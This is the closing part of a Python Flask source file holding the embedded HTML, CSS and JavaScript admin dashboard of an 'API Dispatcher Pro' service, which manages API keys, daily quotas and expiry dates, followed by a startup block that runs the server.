.badge-on{display:flex;align-items:center;gap:5px;background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.2);padding:4px 10px;border-radius:20px;font-size:9px;color:var(--gr)}
.dg{width:4px;height:4px;border-radius:50%;background:var(--gr);animation:bl 2s infinite}
@keyframes bl{0%,100%{opacity:1}50%{opacity:.2}}
.btn-sm{padding:6px 14px;border-radius:7px;border:1px solid var(--bd);background:transparent;color:var(--mu);font-family:var(--mo);font-size:10px;cursor:pointer;transition:all .2s}
.btn-sm:hover{border-color:var(--ac);color:var(--ac)}
.content{padding:20px;max-width:900px;margin:0 auto}

/* Stats row */
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:20px}
.sc{background:var(--card);border:1px solid var(--bd);border-radius:10px;padding:14px;text-align:center}
.sc-v{font-family:'Syne',sans-serif;font-size:20px;font-weight:800;color:var(--ac);margin-bottom:2px}
.sc-l{font-size:9px;color:var(--mu);text-transform:uppercase;letter-spacing:.08em}

/* Section header */
.sh{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;margin-top:20px}
.sh h3{font-family:'Syne',sans-serif;font-size:12px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--mu)}

/* Add key form */
.add-card{background:var(--card);border:1px solid var(--bd);border-radius:10px;padding:16px;margin-bottom:16px}
.form-grid{display:grid;grid-template-columns:1fr 1fr 1fr auto;gap:8px;align-items:end;margin-top:10px}
.fg-lbl{font-size:9px;color:var(--mu);letter-spacing:.08em;text-transform:uppercase;margin-bottom:4px}
.btn-add{padding:11px 16px;border-radius:7px;border:none;background:var(--ac);color:#fff;font-family:var(--mo);font-size:11px;font-weight:600;cursor:pointer;white-space:nowrap;transition:all .2s;height:40px}
.btn-add:hover{opacity:.85}

/* Keys table */
.tcard{background:var(--card);border:1px solid var(--bd);border-radius:10px;overflow:hidden}
table{width:100%;border-collapse:collapse}
th{padding:9px 12px;text-align:left;font-size:9px;letter-spacing:.08em;text-transform:uppercase;color:var(--mu);background:rgba(255,255,255,.02);border-bottom:1px solid var(--bd)}
td{padding:10px 12px;border-bottom:1px solid rgba(255,255,255,.03);font-size:11px}
tr:last-child td{border-bottom:none}
tr:hover td{background:rgba(255,255,255,.015)}
.k-name{color:var(--cy);font-weight:600}
.prog{background:var(--bd);border-radius:4px;height:5px;overflow:hidden;min-width:60px}
.prog-fill{height:100%;border-radius:4px;background:linear-gradient(90deg,var(--ac),var(--cy));transition:width .4s}
.exp-ok{color:var(--gr);font-size:10px}
.exp-warn{color:var(--or);font-size:10px}
.exp-bad{color:var(--re);font-size:10px}
.act-btns{display:flex;gap:6px}
.btn-rev{padding:4px 10px;border-radius:5px;background:rgba(248,113,113,.1);color:var(--re);border:1px solid rgba(248,113,113,.2);font-family:var(--mo);font-size:9px;cursor:pointer;transition:all .2s}
.btn-rev:hover{background:rgba(248,113,113,.2)}
.btn-rst{padding:4px 10px;border-radius:5px;background:rgba(251,146,60,.1);color:var(--or);border:1px solid rgba(251,146,60,.2);font-family:var(--mo);font-size:9px;cursor:pointer;transition:all .2s}
.btn-rst:hover{background:rgba(251,146,60,.2)}
.empty{text-align:center;padding:30px;color:var(--mu);font-size:11px}

/* Toast */
.toast{position:fixed;bottom:20px;right:20px;background:var(--card);border:1px solid var(--bd);border-radius:10px;padding:12px 18px;font-size:11px;z-index:999;transform:translateY(80px);opacity:0;transition:all .3s}
.toast.show{transform:translateY(0);opacity:1}
.toast.ok{border-color:rgba(74,222,128,.4);color:var(--gr)}
.toast.err{border-color:rgba(248,113,113,.4);color:var(--re)}

@media(max-width:640px){
  .stats{grid-template-columns:repeat(2,1fr)}
  .form-grid{grid-template-columns:1fr 1fr;grid-template-rows:auto auto}
  .btn-add{grid-column:1/-1}
  th:nth-child(4),td:nth-child(4){display:none}
}
</style></head><body>

<!-- LOGIN -->
<div id="login">
  <div class="login-box">
    <div class="login-logo">◈ Dispatcher<span>Pro</span></div>
    <div class="login-sub">ADMIN PANEL · SECURE ACCESS</div>
    <input class="inp" type="password" id="pass" placeholder="Master password..." onkeydown="if(event.key==='Enter')doLogin()">
    <button class="btn-login" onclick="doLogin()">Unlock Dashboard</button>
    <div class="err" id="err">⚠ Invalid password</div>
  </div>
</div>

<!-- DASHBOARD -->
<div id="dash">
  <div class="topbar">
    <div class="tb-brand">◈ Dispatcher<span>Pro</span></div>
    <div class="tb-right">
      <div class="badge-on"><div class="dg"></div>Online</div>
      <button class="btn-sm" onclick="doLogout()">Logout</button>
    </div>
  </div>
  <div class="content">
    <div class="stats">
      <div class="sc"><div class="sc-v" id="s-keys">—</div><div class="sc-l">Total Keys</div></div>
      <div class="sc"><div class="sc-v" id="s-req">—</div><div class="sc-l">Requests Today</div></div>
      <div class="sc"><div class="sc-v" id="s-mod">—</div><div class="sc-l">Modules</div></div>
      <div class="sc"><div class="sc-v" id="s-sr">—</div><div class="sc-l">Success Rate</div></div>
    </div>

    <div class="sh"><h3>Create New Key</h3></div>
    <div class="add-card">
      <div class="form-grid">
        <div><div class="fg-lbl">Key Name</div><input class="inp" id="nk" placeholder="client_vip" style="margin:0"></div>
        <div><div class="fg-lbl">Daily Limit</div><input class="inp" id="nl" type="number" value="1000" style="margin:0"></div>
        <div><div class="fg-lbl">Expires</div><input class="inp" id="ne" type="date" style="margin:0"></div>
        <button class="btn-add" onclick="addKey()">+ Add Key</button>
      </div>
    </div>

    <div class="sh"><h3>Active Keys</h3><button class="btn-sm" onclick="resetDaily()" style="font-size:9px">Reset Daily Quotas</button></div>
    <div class="tcard">
      <table>
        <thead><tr><th>Key Name</th><th>Usage</th><th>Limit</th><th>Expires</th><th>Actions</th></tr></thead>
        <tbody id="ktb"></tbody>
      </table>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
let tok = localStorage.getItem('_adm');
if(tok) boot();

function doLogin(){
  tok = document.getElementById('pass').value;
  if(!tok) return;
  boot();
}

async function boot(){
  try{
    const r = await fetch('/admin/api/keys',{headers:{'X-Admin-Token':tok}});
    if(r.status===403){
      document.getElementById('err').style.display='block';
      localStorage.removeItem('_adm');
      return;
    }
    localStorage.setItem('_adm',tok);
    document.getElementById('login').style.display='none';
    document.getElementById('dash').style.display='block';
    const d = await r.json();
    renderKeys(d.keys);
    loadStats();
  }catch(e){showToast('Network error','err')}
}

async function loadStats(){
  try{
    const r = await fetch('/api/stats?key='+encodeURIComponent(tok));
    if(!r.ok) return;
    const d = await r.json();
    document.getElementById('s-req').textContent = d.stats.total_requests.toLocaleString();
    document.getElementById('s-sr').textContent = d.stats.success_rate+'%';
  }catch(e){}
}

function renderKeys(keys){
  document.getElementById('s-keys').textContent = keys.length;
  const tb = document.getElementById('ktb');
  if(!keys.length){tb.innerHTML='<tr><td colspan="5" class="empty">No keys found</td></tr>';return;}
  const today = new Date().toISOString().split('T')[0];
  tb.innerHTML = keys.map(k=>{
    const pct = k.daily_limit > 0 ? Math.min(100,Math.round(k.requests_today/k.daily_limit*100)) : 0;
    const expClass = k.expires < today ? 'exp-bad' : k.expires < new Date(Date.now()+7*86400000).toISOString().split('T')[0] ? 'exp-warn' : 'exp-ok';
    return `<tr>
      <td class="k-name">${k.key}</td>
      <td><div style="display:flex;align-items:center;gap:8px"><span style="font-size:10px;min-width:60px">${k.requests_today} / ${k.daily_limit}</span><div class="prog"><div class="prog-fill" style="width:${pct}%"></div></div></span></div></td>
      <td style="font-size:10px;color:#94a3b8">${k.daily_limit.toLocaleString()}</td>
      <td class="${expClass}">${k.expires}</td>
      <td><div class="act-btns">
        <button class="btn-rev" onclick="revokeKey('${k.key}')">Revoke</button>
      </div></td>
    </tr>`;
  }).join('');
  // Set module count guess from loaded page
  document.getElementById('s-mod').textContent = '136';
}

async function addKey(){
  const k=document.getElementById('nk').value.trim();
  const l=document.getElementById('nl').value;
  const e=document.getElementById('ne').value;
  if(!k) return showToast('Enter key name','err');
  const body={key:k,limit:parseInt(l)||1000};
  if(e) body.expires=e;
  const r=await fetch('/admin/api/keys/add',{method:'POST',headers:{'Content-Type':'application/json','X-Admin-Token':tok},body:JSON.stringify(body)});
  const d=await r.json();
  if(d.success){document.getElementById('nk').value='';showToast('Key added ✓','ok');boot();}
  else showToast(d.error||'Error','err');
}

async function revokeKey(k){
  if(!confirm('Revoke key: '+k+'?')) return;
  const r=await fetch('/admin/api/keys/remove',{method:'POST',headers:{'Content-Type':'application/json','X-Admin-Token':tok},body:JSON.stringify({key:k})});
  const d=await r.json();
  d.success ? (showToast('Key revoked','ok'),boot()) : showToast(d.error||'Error','err');
}

async function resetDaily(){
  if(!confirm('Reset all daily quotas?')) return;
  const r=await fetch('/admin/reset_daily',{method:'POST',headers:{'X-Admin-Token':tok}});
  const d=await r.json();
  d.success ? (showToast('Daily quotas reset ✓','ok'),boot()) : showToast('Error','err');
}

function doLogout(){localStorage.removeItem('_adm');location.reload()}

function showToast(msg,type='ok'){
  const t=document.getElementById('toast');
  t.textContent=msg;t.className='toast '+type;t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'),2800);
}
</script>
</body></html>"""


# ==================== স্টার্টআপ ====================
if __name__ == '__main__':
    print("=" * 55)
    print("🚀 System Starting... [API Dispatcher Pro]")
    print(f"🔗 Modules Loaded: {len(APIS)}")
    print("=" * 55)
    app.run(host='0.0.0.0', port=5000, debug=False)
